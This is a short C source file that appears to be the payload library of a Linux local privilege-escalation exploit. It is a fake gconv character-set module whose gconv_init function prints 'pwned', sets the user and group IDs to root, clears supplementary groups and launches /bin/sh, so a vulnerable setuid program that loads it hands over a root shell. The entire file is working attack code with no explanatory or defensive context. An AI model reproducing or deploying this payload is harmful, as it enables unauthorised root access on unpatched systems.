#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
  puts("pwned");
  setuid(0);
  setgid(0);
  setgroups(0);
  system("/bin/sh");
  exit(0);
}
